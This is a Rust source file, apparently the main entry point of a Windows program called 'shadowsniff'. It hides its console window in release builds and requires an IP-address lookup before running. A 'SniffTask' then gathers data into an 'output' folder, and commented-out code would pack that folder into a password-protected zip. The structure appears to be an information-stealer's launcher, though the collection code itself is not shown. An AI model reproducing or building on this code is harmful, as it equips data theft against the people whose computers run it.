#![no_main]
#![no_std]
#![cfg_attr(debug_assertions, windows_subsystem = "console")]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::format;
use collector::atomic::AtomicCollector;
use collector::DisplayCollector;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, FileSystemExt};
use ipinfo::init_ip_info;
use shadowsniff::SniffTask;
use tasks::Task;
use utils::log_debug;

mod panic;

#[global_allocator]
static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;

#[unsafe(no_mangle)]
#[allow(unused_unsafe)]
pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
    if !init_ip_info() {
        panic!()
    }

    let fs = StorageFileSystem;
    let out = &Path::new("output");
    let _ = fs.remove_dir_all(out);
    let _ = fs.mkdir(out);

    let collector = AtomicCollector::default();

    unsafe {
        SniffTask::default().run(out, &fs, &collector);
    }

    let displayed_collector = format!("{}", DisplayCollector(collector));

    log_debug!("{displayed_collector}");

    // let zip = ZipArchive::default()
    //     .add_folder_content(&fs, &out)
    //     .password("shadowsniff-output")
    //     .comment(displayed_collector)
    //     .create();
    //
    // let out = Path::new("output.zip");
    // let _ = StorageFileSystem.write_file(&out, &zip);

    0
}
